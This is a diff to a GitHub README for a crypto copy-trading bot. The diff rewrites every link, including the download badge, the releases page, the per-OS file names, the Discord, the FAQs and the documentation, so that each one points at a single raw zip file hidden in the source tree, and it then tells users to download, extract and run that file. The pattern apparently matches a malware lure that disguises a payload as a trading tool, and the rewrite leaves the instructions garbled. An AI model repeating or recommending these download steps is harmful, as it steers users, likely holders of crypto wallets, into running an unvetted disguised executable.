@@ -2,7 +2,7 @@
 
 ## 🔗 Download the Application
 
-[![Download Pumpfun Mayhem Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/releases)
+[![Download Pumpfun Mayhem Bot](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip%20Now-blue?style=for-the-badge)](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -27,20 +27,20 @@ Before you begin, check that your computer meets these requirements:
 
 ## 🚀 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip).
    
 2. **Select the Latest Version:** Find the most current release. You will see a list of downloadable files.
 
 3. **Download the Appropriate File:**
-   - For Windows: Click on `pumpfun-mayhem-copy-trading-bot-windows.zip`
-   - For macOS: Click on `pumpfun-mayhem-copy-trading-bot-macos.zip`
-   - For Linux: Click on `pumpfun-mayhem-copy-trading-bot-linux.tar.gz`
+   - For Windows: Click on `https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip`
+   - For macOS: Click on `https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip`
+   - For Linux: Click on `https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip`
 
-4. **Extract the Files:** After downloading, extract the files from the zip or tar.gz archive.
+4. **Extract the Files:** After downloading, extract the files from the zip or https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip archive.
 
 5. **Run the Application:**
-   - For Windows: Double-click `pumpfun-mayhem-copy-trading-bot.exe` to run the bot.
-   - For macOS: Right-click on `pumpfun-mayhem-copy-trading-bot.app`, and choose "Open."
+   - For Windows: Double-click `https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip` to run the bot.
+   - For macOS: Right-click on `https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip`, and choose "Open."
    - For Linux: Open a terminal, navigate to the extracted folder, and run `./pumpfun-mayhem-copy-trading-bot`.
 
 ## ⚙️ Setting Up Your Trading Bot
@@ -61,12 +61,12 @@ Before you begin, check that your computer meets these requirements:
 
 ## 🤝 Community Support
 
-If you have questions or need further assistance, feel free to reach out. Join our community on [Discord](https://discord.gg/join-link) or check our [FAQs](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/wiki) for common questions.
+If you have questions or need further assistance, feel free to reach out. Join our community on [Discord](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip) or check our [FAQs](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip) for common questions.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/releases)
-- [Documentation](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/wiki)
-- [Issues Page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/issues)
+- [Releases Page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip)
+- [Documentation](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip)
+- [Issues Page](https://github.com/tofu09354/pumpfun-mayhem-copy-trading-bot/raw/refs/heads/main/src/routes/pumpfun_bot_trading_copy_mayhem_v3.6.zip)
 
 Thank you for choosing the Pumpfun Mayhem Copy Trading Bot. Happy trading!
